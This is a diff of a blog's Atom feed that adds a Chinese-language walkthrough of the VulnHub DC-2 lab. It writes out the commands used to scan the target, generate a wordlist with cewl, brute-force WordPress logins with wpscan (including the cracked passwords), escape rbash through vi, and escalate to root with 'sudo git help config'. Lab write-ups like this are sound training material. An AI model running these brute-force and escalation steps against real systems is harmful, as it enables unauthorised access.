@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-07-04T14:15:22.583Z</updated>
+  <updated>2020-07-08T11:34:47.378Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,36 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>VulnHub渗透之DC-2</title>
+    <link href="http://yoursite.com/2020/07/08/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-2/"/>
+    <id>http://yoursite.com/2020/07/08/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-2/</id>
+    <published>2020-07-08T11:34:52.000Z</published>
+    <updated>2020-07-08T11:34:47.378Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0×00-说明">0×00 说明</h2><p><strong>知识点：WordPress、受限shell、git提权</strong></p><blockquote><p>kali：192.168.101.10<br>靶机和kali处于同一局域网</p></blockquote><h2 id="0x01-信息收集">0x01 信息收集</h2><ol><li>探测目标地址</li></ol><p>命令：<code>arp-scan -l</code> 或者 <code>nmap -sP 192.168.101.0/24</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708153613.png" alt=""></p><p>靶机地址为192.168.101.17</p><ol start="2"><li>探测目标开放端口</li></ol><p>命令：<code>nmap -sV -p- 192.168.101.17</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708154210.png" alt=""></p><p>靶机开放了80端口和7744端口，7744为SSH，先访问下80</p><blockquote><p>ts：需要先修改hosts文件，kali上的hosts位置在 /etc/hosts</p></blockquote><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708154819.png" alt=""></p><h2 id="0x02-Flag1">0x02 Flag1</h2><p>访问成功，使用wappalyzer查看下网站所使用的技术</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708155044.png" alt=""></p><p>网站为 WordPress CMS构建，并且发现第一个flag</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708154934.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Flag 1:</span><br><span class="line"></span><br><span class="line">Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</span><br><span class="line"></span><br><span class="line">More passwords is always better, but sometimes you just can’t win them all.</span><br><span class="line"></span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line"></span><br><span class="line">If you can’t find it, log in as another.</span><br></pre></td></tr></table></figure><p>提示使用cewl工具，并且只有登陆之后才能看到下一个flag</p><h2 id="0x03-Flag2">0x03 Flag2</h2><p>cewl工具可以根据url来生成对应的密码字典<br>命令：<code>cewl -w /root/dic/dc2_passwd.txt http://dc-2/</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708161432.png" alt=""></p><p>有了密码，接下来使用wpscan，它可以查询出wordpress的用户名，-e u是枚举用户名，默认从1-10<br>命令：<code>wpscan --url http://dc-2/ -e u</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708161924.png" alt=""></p><p>接下来，找出 WordPress 登陆地址，可以网上查找或者工具去扫描<br>工具可以用dirb，命令：<code>dirb http://dc-2/</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708162403.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708165933.png" alt=""></p><p>字典地址都具备了，使用wpscan进行爆破<br>命令：<code>wpscan --url http://dc-2/wp-admin -U /root/dic/dc2_username.txt -P /root/dic/dc2_passwd.txt</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708171549.png" alt=""></p><p>爆破成功，结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: jerry, Password: adipiscing</span><br><span class="line"> | Username: tom, Password: parturient</span><br></pre></td></tr></table></figure><p>使用 jerry 登陆，找到了flag2</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708171905.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line"></span><br><span class="line">If you can&#39;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure><p>意思是，WordPress行不通就换个方式</p><h2 id="0x04-Flag3">0x04 Flag3</h2><p>于是想到之前还有个SSH服务，便尝试登陆，发现jerry无法登录，tom可以</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708172252.png" alt=""><br><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708172433.png" alt=""></p><p><code>ls</code> 发现 <code>flag3.txt</code> 在当前目录下，但是使用 <code>cat</code> 却提示 <code>-rbash: cat: command not found</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708172620.png" alt=""></p><p>这是一个受限shell环境，常见的受限shell环境类型包括rbash、rksh和rsh，于是现在需要绕过rbash，<code>compgen</code>还能使用，查看下当前可以执行的命令<br>命令：<code>compgen -c</code></p><blockquote><p>受限shell是LinuxShell限制一些bash shell中的功能，并且是从名字上很清楚。 该限制很好地实现&gt; 了命令以及脚本在受限shell中运行。 它为Linux中的bash shell提供了一个额外的安全层。</p></blockquote><p>大概清楚了，查看当前环境变量：<code>echo $PATH</code>，发现位于<code>/home/tom/usr/bin</code>下，用<code>vi</code>转义受限制的shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p>然后设置环境变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PATH&#x3D;&#x2F;bin:&#x2F;usr&#x2F;bin:$PATH</span><br><span class="line">export SHELL&#x3D;&#x2F;bin&#x2F;bash:$SHELL</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708173847.png" alt=""></p><p>成功绕过rbash，并读取了flag3.txt的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure><p>实际上，是要让我们切换 jerry 用户</p><h2 id="0x05-Flag4">0x05 Flag4</h2><p>使用<code>su jerry</code>切换 jerry 用户，回到jerry的家目录查看，发现了flag4</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708174603.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Good to see that you&#39;ve made it this far - but you&#39;re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you&#39;re on your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure><p>告诉我们只差最后一个flag了，还提示了 <code>git</code></p><h2 id="0x06-Flag5">0x06 Flag5</h2><p>其实是使用<code>git</code>进行提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708175605.png" alt=""></p><p>拿到最后的 flag .</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;0×00-说明&quot;&gt;0×00 说明&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;知识点：WordPress、受限shell、git提权&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;kali：192.168.101.10&lt;br&gt;
+靶机和kali处于同一局域网&lt;/p&gt;
+      
+    
+    </summary>
+    
+    
+      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+      <category term="VulnHub" scheme="http://yoursite.com/tags/VulnHub/"/>
+    
+  </entry>
   
   <entry>
     <title>通过DNSLog获取无回显信息</title>
